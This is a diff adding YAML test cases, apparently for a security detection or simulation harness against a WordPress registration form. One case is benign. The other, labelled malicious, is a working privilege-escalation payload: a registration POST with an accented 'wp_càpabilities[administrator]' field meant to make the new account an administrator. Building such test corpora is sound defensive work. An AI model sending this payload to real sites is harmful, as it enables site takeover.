@@ -22,3 +22,42 @@
     path: /
     params:
       s: "quarterly report"
+
+- name: corp-normal-registration
+  malicious: false
+  correlation: marker
+  request:
+    method: POST
+    path: /register/
+    data:
+      form_id: "5"
+      um_request: ""
+      _wp_http_referer: "/register/"
+      "user_login-5": "newcomer"
+      "first_name-5": "New"
+      "last_name-5": "Comer"
+      "user_email-5": "newcomer@example.com"
+      "user_password-5": "Welcome-2026-aA"
+      "confirm_user_password-5": "Welcome-2026-aA"
+
+- name: corp-rogue-admin
+  malicious: true
+  stage: escalate-privileges
+  technique: T1068
+  pattern: CAPEC-233
+  expect: "[administrator]"
+  correlation: marker
+  request:
+    method: POST
+    path: /register/
+    data:
+      form_id: "5"
+      um_request: ""
+      _wp_http_referer: "/register/"
+      "user_login-5": "northwind_intern"
+      "first_name-5": "North"
+      "last_name-5": "Wind"
+      "user_email-5": "northwind_intern@example.com"
+      "user_password-5": "Str0ng-Pass-9271"
+      "confirm_user_password-5": "Str0ng-Pass-9271"
+      "wp_càpabilities[administrator]": "1"
